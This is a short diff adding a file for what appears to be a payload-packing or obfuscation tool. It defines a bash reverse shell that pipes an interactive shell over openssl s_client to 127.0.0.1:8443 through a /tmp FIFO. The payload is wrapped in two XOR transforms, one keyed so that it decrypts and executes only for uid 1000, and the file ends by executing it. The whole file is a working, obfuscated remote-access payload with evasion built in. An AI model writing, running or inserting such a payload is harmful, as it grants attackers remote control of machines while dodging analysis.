@@ -1,0 +1,13 @@
+executable reverse_shell
+  content
+mkfifo /tmp/rs;
+/bin/bash -i < /tmp/rs 2>&1 | openssl s_client -quiet -no_check_time -noservername -connect 127.0.0.1:8443 > /tmp/rs;
+rm /tmp/rs;
+  !!!
+  transform
+    xor key:anotherkey
+    xor key:will_only_deobfuscate_and_execute_with_success_if_the_uid_is_equal_to_1000 uid:1000
+  !!!
+
+with shell
+  execute reverse_shell
